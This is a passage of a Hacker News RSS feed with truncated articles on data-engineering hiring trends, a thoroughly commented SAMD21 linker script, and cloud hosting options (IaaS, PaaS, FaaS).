<p>I disregarded both of these types of companies rather than reach out to them, so they are not part of this analysis.</p>
<p>Another thing: the bulk of this research was done towards the final weeks of 2020. Open roles may have changed as companies update their pages periodically. However, I don’t believe this will drastically impact the conclusions drawn. </p>
<h2>What Are Data Practitioners Responsible For?</h2>
<p>Before diving into the results, it’s worth spending some time clarifying what responsibilities each data role is typically responsible for. Here are the four roles we will spend our time looking at with a short description of what they do:</p>
<ul>
<li><em>Data scientist</em>: Use various techniques in statistics and machine learning to process and analyse data. Often responsible for building models to probe what can be learned from some data source, though often at a prototype rather than production level. </li>
<li><em>Data engineer</em>: Develops a robust and scalable set of data processing tools/platforms. Must be comfortable with SQL/NoSQL database wrangling and building/maintaining ETL pipelines.</li>
<li><em>Machine Learning (ML) Engineer</em>: Often responsible for both training models and productionizing them. Requires familiarity with some high-level ML framework and also must be comfortable building scalable training, inference, and deployment pipelines for models.</li>
<li><em>Machine Learning (ML) Scientist</em>: Works on cutting-edge research. Typically responsible for exploring new ideas that can be published at academic conferences. Often only needs to prototype new state-of-the-art models before handing off to ML engineers for productionization.</li>
</ul>
<h2>How Many Data Roles Are There?</h2>
<p>So what happens when we plot the frequency of each data role that companies are hiring for? The plot looks  like this:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies" title="" src="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png" srcset="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-d182c.png 240w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-5220f.png 480w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png 960w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>What immediately stands out is how many more open <em>data engineer</em> roles there are compared to traditional <em>data scientists</em>. In this case, the raw counts correspond to companies hiring <strong>roughly 55% more</strong> for data engineers than data scientists, and roughly the same number of machine learning engineers as data scientists.</p>
<p>But we can do more. If you look at the titles of the various roles, there seems to be some repetition. </p>
<p>Let’s only provide coarse-grained categorization through role consolidation. In other words, I took roles whose descriptions were roughly equivalent and consolidated them under a single title. </p>
<p>That included the following set of equivalence relations: </p>
<ul>
<li><em>NLP engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>CV engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning engineer</em> (while the domains might be different, the responsiblities are roughly the same)</li>
<li><em>ML scientist</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning researcher</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML intern</em> (the internship description very much seemed research-focused)</li>
<li><em>Data engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data architect</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Head of data</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data platform engineer</em></li>
</ul>
<figure>
    
  <a href="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies consolidated into coarse categories" title="" src="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png" srcset="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-d182c.png 240w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-5220f.png 480w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png 960w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>If we don’t like dealing with raw counts, here are some percentages to put us at ease:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies normalized frequencies" title="" src="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png" srcset="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-d182c.png 240w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-5220f.png 480w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png 960w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>I probably could have lumped <em>ML research engineer</em> into one of the <em>ML scientist</em> or <em>ML engineer</em> bins, but given that it was a bit of a hybrid role, I left it as is. </p>
<p>Overall the consolidation made the differences even more pronounced! There are <strong>~70%</strong> more open <em>data engineer</em> than <em>data scientist</em> positions. In addition, there are <strong>~40%</strong> more open <em>ML engineer</em> than <em>data scientist</em> positions. There are also only <strong>~30%</strong> as many <em>ML scientist</em> as <em>data scientist</em> positions. </p>
<h2>Takeaways</h2>
<p><em>Data engineers</em> are in increasingly high demand compared to other data-driven professions. In a sense, this represents an evolution for the broader field. </p>
<p>When machine learning become hot 🔥 5-8 years ago, companies decided they need people that can make classifiers on data. But then frameworks like <a href="https://www.tensorflow.org/">Tensorflow</a> and <a href="https://pytorch.org/">PyTorch</a> became really good, democratizing the ability to get started with deep learning and machine learning. </p>
<p>This commoditized the data modelling skillset. </p>
<p>Today, the bottleneck in helping companies get machine learning and modelling insights to production center on data problems. </p>
<p>How do you annotate data? How do you process and clean data? How do you move it from A to B? How do you do this every day as quickly as possible?</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="patrick star moving data" title="" src="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" srcset="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-8c52f.png 240w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-0f208.png 480w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png 720w" sizes="(max-width: 720px) 100vw, 720px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>All that amounts to having good engineering skills. </p>
<p>This may sound boring and unsexy, but old-school software engineering with a bend toward data may be what we really need right now. </p>
<p>For years, we’ve become enamored with the idea of data professionals that breathe life into raw data thanks to cool demos and media hype. After all, when was the last time you saw a <a href="https://techcrunch.com/">TechCrunch</a> article about an ETL pipeline? </p>
<p>If nothing else, I believe solid engineering is something we don’t emphasize enough in data science job training or educational programs. In addition to learning how to use <em>linear_regression.fit()</em>, learn how to write a unit test too!</p>
<p>So does that mean you shouldn’t study data science? No. </p>
<p>What it means is that competition is going to be tougher. There are going to be fewer positions available for what is looking to be an abundance of newcomers to the market trained to do data science. </p>
<p>There will always be a need for people that can effectively analyze and extract actionable insights from data. But they have to be good. </p>
<p>Downloading a pretrained model off the Tensorflow website on the <a href="https://scikit-learn.org/stable/auto_examples/datasets/plot_iris_dataset.html">Iris dataset</a> probably is no longer enough to get that data science job. </p>
<p>It’s clear, however, with the large number of <em>ML engineer</em> openings that companies often want a hybrid data practitioner: someone that can build and deploy models. Or said more succinctly, someone that can use Tensorflow but can also build it from source.</p>
<p>Another takeaway here is that there just aren’t that many ML research positions. </p>
<p>Machine learning research tends to get its fair share of hype because that’s where all the cutting-edge stuff happens, all the <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">AlphaGo</a> and <a href="https://openai.com/blog/openai-api/">GPT-3</a> and what-not. </p>
<p>But for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</a></em></p>]]>
            </description>
            <link>https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775872</guid>
            <pubDate>Thu, 14 Jan 2021 13:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most thoroughly commented linker script (probably)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25775854">thread link</a>) | @signa11
<br/>
January 14, 2021 | https://blog.thea.codes/the-most-thoroughly-commented-linker-script/ | <a href="https://web.archive.org/web/*/https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands">https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands</a></li>
<li><a href="https://sourceware.org/binutils/docs/ld/BFD.html">https://sourceware.org/binutils/docs/ld/BFD.html</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 11.1.11, Cortex M0+ Configuration</li>
</ul>
<pre><span>OUTPUT_FORMAT</span><span>(</span><span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>)</span>
</pre>
<h2 id="cpu-memory-configuration-variables">CPU memory configuration variables</h2>
<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for
"non-volatile memory" (NVM) - which is used by the application
to store calibration and user settings.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>FLASH_SIZE</span> <span>=</span> <span>0x40000</span><span>;</span>      <span>/* 256kB */</span>
<span>BOOTLOADER_SIZE</span> <span>=</span> <span>0x2000</span><span>;</span>  <span>/* 8kB */</span>
<span>NVM_SIZE</span> <span>=</span> <span>0x400</span><span>;</span>          <span>/* 1kbB */</span>
<span>SRAM_SIZE</span> <span>=</span> <span>0x8000</span><span>;</span>        <span>/* 32kB */</span>
</pre>
<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>
flag and you can enable compiler warnings for stack usage
with <code>-Wstack-usage=STACK_SIZE</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/">https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/</a></li>
<li><a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications">https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html">https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html">https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html</a></li>
</ul>
<pre><span>STACK_SIZE</span> <span>=</span> <span>DEFINED</span><span>(</span><span>__stack_size__</span><span>)</span> <span>?</span> <span>__stack_size__</span> <span>:</span> <span>0x800</span><span>;</span>
</pre>
<h2 id="memory-space-definition">Memory space definition</h2>
<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY">https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>MEMORY</span>
<span>{</span>
</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/adafruit/uf2-samdx1#configuration">https://github.com/adafruit/uf2-samdx1#configuration</a></li>
</ul>
<pre>    <span>bootloader</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>BOOTLOADER_SIZE</span>
</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>
<pre>   <span>rom</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00002000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>BOOTLOADER_SIZE</span> <span>-</span> <span>NVM_SIZE</span>
</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>
<pre>   <span>nvm</span> <span>(</span><span>r</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>NVM_SIZE</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>NVM_SIZE</span>
</pre>
<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>
<p>For the SAMD21, SRAM starts at 0x20000000 and is contiguous
for the size of the SRAM.</p>
<pre>   <span>ram</span> <span>(</span><span>rwx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x20000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>SRAM_SIZE</span>
<span>}</span>
</pre>
<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS">https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS</a></li>
</ul>
<pre><span>SECTIONS</span>
<span>{</span>
</pre>
<p>The text segment contains program code and read-only data.</p>
<p>References:</p>
<ul>
<li><a href="https://developer.arm.com/documentation/dui0101/a/">https://developer.arm.com/documentation/dui0101/a/</a>
Page 5, Segments</li>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
</ul>
<pre>   <span>.</span><span>text</span> <span>:</span>
   <span>{</span>
</pre>
<p>This segment must be 4-byte aligned as defined in ARM ELF
File Format specification.</p>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
</pre>
<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
Secion 8.3.3, Fetching of Initial Instructions</li>
<li><a href="https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf">https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf</a>
Section B1.5.3, The vector table
Section B3.2.5, Vector Table Offset Register, VTOR</li>
<li><a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/tree/master/firmware/third_party/samd21/gcc/gcc/startup_samd21.c">startup_samd21.c</a></li>
</ul>
<pre>      <span>_sfixed</span> <span>=</span> <span>.;</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>vectors</span> <span>.</span><span>vectors</span><span>.</span><span>*</span><span>))</span>
</pre>
<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>
</ul>
<p>References:</p>
<ul>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html">https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html</a></li>
<li><a href="https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section">https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section</a></li>
</ul>
<pre>      <span>*</span><span>(.</span><span>text</span> <span>.</span><span>text</span><span>.</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>t</span><span>.</span><span>*</span><span>)</span>
      <span>*</span><span>(.</span><span>rodata</span> <span>.</span><span>rodata</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>r</span><span>.</span><span>*</span><span>)</span>
</pre>
<h2 id="c-c-runtime-support">C &amp; C++ runtime support</h2>
<p>The following sections are for the C/C++ runtime. These are generally used by crt0.</p>
<p>References:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Crt0">https://en.wikipedia.org/wiki/Crt0</a></li>
</ul>
<h3 id="initializers">Initializers</h3>
<ul>
<li>C++ Runtime: initializers for static variables.</li>
<li>C Runtime: designated constructors</li>
</ul>
<p>For C++, handles variables at file scope like this:</p>
<pre><span>int</span> <span>f</span> <span>=</span> <span>some_func</span><span>()</span>
</pre>
<p>For C, handles functions designated as constructors:</p>
<pre><code>void intialize_thing(void) __attribute__((constructor));
</code></pre>
<p>Executed by the C runtime at startup via <code>__libc_init_array</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c">https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c</a></li>
<li><a href="https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c">https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c</a>;</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/Initialization.html">https://gcc.gnu.org/onlinedocs/gccint/Initialization.html</a></li>
<li><a href="https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction">https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction</a></li>
<li><a href="https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array">https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array</a></li>
</ul>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>init</span><span>))</span>
      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
  …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</a></em></p>]]>
            </description>
            <link>https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775854</guid>
            <pubDate>Thu, 14 Jan 2021 13:06:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create and Share stunning images of source code (CodeKeep Shots)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25775810">thread link</a>) | @jp1016
<br/>
January 14, 2021 | https://codekeep.io/screenshot | <a href="https://web.archive.org/web/*/https://codekeep.io/screenshot">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://codekeep.io/screenshot</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775810</guid>
            <pubDate>Thu, 14 Jan 2021 13:00:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Big Little Guide to Running Code in the Cloud(s)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25775783">thread link</a>) | @sudhirj
<br/>
January 14, 2021 | https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/ | <a href="https://web.archive.org/web/*/https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <p>As software developers, we've come a long way... from fighting over limited time slices of lab computing, we've arrived at being able to instantly deploy and run code on servers in hundreds of edge data-centers in cities all over the world. This guide evaluates some of the cloud computing options that have become available over two decades—we'll cover the offerings from the three major cloud providers, along with a few other companies building interesting options. </p><p>The common stages of application development are <em>writing</em> code, <em>packaging</em> code, <em>deploying</em> and <em>running</em> code. In this guide we'll talk about advances in <em>packaging</em>, <em>deploying</em> and <em>running</em> code. We'll also cover the basics of the infrastructure required to connect our applications to the rest of the internet, like load-balancers, request protocols and routing. We <em>won't</em> be looking at databases, data storage, <a href="https://sudhir.io/the-big-little-guide-to-message-queues/">message queues</a>, and other advances here—these are all massive topics that deserve their own separate guides. We'll be looking at three kinds of service providers: <em>IaaS</em> or <em>infrastructure-as-a-service</em>, <em>PaaS</em> or <em>platform-as-a-service</em>, and <em>FaaS</em> or <em>functions-as-a-service</em>. </p><p>An <em><strong>IaaS,</strong></em> or <em>infrastructure-as-a-service</em> system gives you all the basic building blocks necessary to run your application, and asks you to make all the decisions about how your application should run—and also do all the work required to setup, configure, maintain and monitor it. The building blocks might have some loose integrations with each other, but you'll have to do most of the wiring to make them work together. </p><p>A <strong><em>PaaS</em></strong>, or <em>platform-as-a-service</em> system makes a lot of those decisions for you, and does a lot of the work itself. The servers are already configured correctly and high-performance request routing and monitoring is taken care of. Operational maintenance is also handled for you, with the PaaS employing a highly trained team of engineers on a 24/7/365 pager duty schedule to make sure everything is running according to your choices. All you need to do is submit the application, configure it, and make a few strategic choices about how you want things to work. </p><p>A <em><strong>FaaS</strong></em>, of <em>functions-as-a-service</em> system, works very differently. Your application is <em>not</em> a stand-alone system here—it's a smaller piece of code that fits tightly into a much larger framework offered by the FaaS system. It cannot run independently—it needs to follow the technology, dependency, packaging, deployment and execution rules of the FaaS, and it can run only in the context of that FaaS. In exchange for conforming to these tight rules the FaaS offers you something that's very hard, if not impossible, to achieve using any other kind of system. We'll cover what “magic” a FaaS provides, along with what the tradeoffs are and how to reduce their impact on your work. </p><h2 id="simple-iaas">Simple IaaS </h2><p>The simplest way to deploy an application on the cloud is to rent one server and deploy it there. AWS has <a href="https://aws.amazon.com/ec2/">EC2</a>, Google has <a href="https://cloud.google.com/compute">Compute Engine</a>—Azure doesn't bother with a marketing department and just puts everyone in sales, so they just call them <a href="https://azure.microsoft.com/en-in/services/virtual-machines/">Virtual Machines</a>. As Azure very helpfully points out, these servers are all <em>virtual machines</em>. They're real servers with CPU, RAM, disks and networking installed in a data-center building somewhere, and they're either rented out to you as a whole, or split into smaller sections using <em>virtualization</em> hardware and software—hence the term “virtual” machines. This splitting is invisible to you, the customer—you'll see each virtual section that you rent as a complete, isolated, fully functioning machine. There's a lot of incredible engineering that goes into doing this securely <em>and</em> with high-performance—if you're interested the <a href="https://aws.amazon.com/ec2/nitro/">AWS Nitro System</a> is worth reading up on.</p><p>Your server needs to be reachable on the internet, so the first thing it'll have is an <a href="https://en.wikipedia.org/wiki/IPv4">IP address</a>. These are a pretty scarce resource, though—represented as four numbers from 0 to 255, there are only 4,294,967,296 (256 x 256 x 256 x 256) possible addresses, out of which fewer are usable and available. So the cloud providers will usually either give you any available address, or allow you to reserve one—often for free if you're actually using it, but at extra charges if you're squatting without using it. AWS calls this <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html">Elastic IP</a>, and Google calls it “<a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">Reserving a static external IP address</a>”, because they're probably in the process of moving everyone from marketing into sales. You probably already guessed what Azure <a href="https://azure.microsoft.com/en-in/blog/reserved-ip-addresses/">calls it</a>. There's also support rolling out for a newer larger address format called <a href="https://en.wikipedia.org/wiki/IPv6">IPv6</a> that's four times longer and has more addresses than all the grains of sand on a billion earths—but that will take a little longer before it's fully adopted. We'll revisit IPv6 addressing 